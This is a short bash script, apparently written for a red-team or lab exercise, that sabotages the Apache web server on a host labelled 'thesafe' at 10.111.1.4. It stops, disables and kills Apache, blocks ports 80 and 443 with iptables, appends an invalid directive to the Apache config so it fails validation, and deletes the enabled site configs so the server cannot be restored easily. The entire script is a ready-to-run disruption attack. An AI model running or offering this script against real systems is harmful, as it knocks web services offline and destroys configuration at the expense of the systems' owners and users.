#!/bin/bash
# thesafe (10.111.1.4) - Apache disruption

systemctl stop apache2 httpd 2>/dev/null
systemctl disable apache2 httpd 2>/dev/null

pkill -9 apache2  2>/dev/null
pkill -9 httpd    2>/dev/null

# Block HTTP/HTTPS
iptables -I INPUT -p tcp --dport 80  -j DROP
iptables -I INPUT -p tcp --dport 443 -j DROP

# Break the config
for conf in /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf; do
    if [ -f "$conf" ]; then
        cp "$conf" "${conf}.bak" 2>/dev/null
        # Add a syntax error so apachectl configtest fails
        echo "INVALID_DIRECTIVE_BREAK" >> "$conf"
    fi
done

# Remove the default site enable so even a fixed binary serves nothing
rm -f /etc/apache2/sites-enabled/*.conf 2>/dev/null

echo "[*] Apache disruption complete on thesafe"
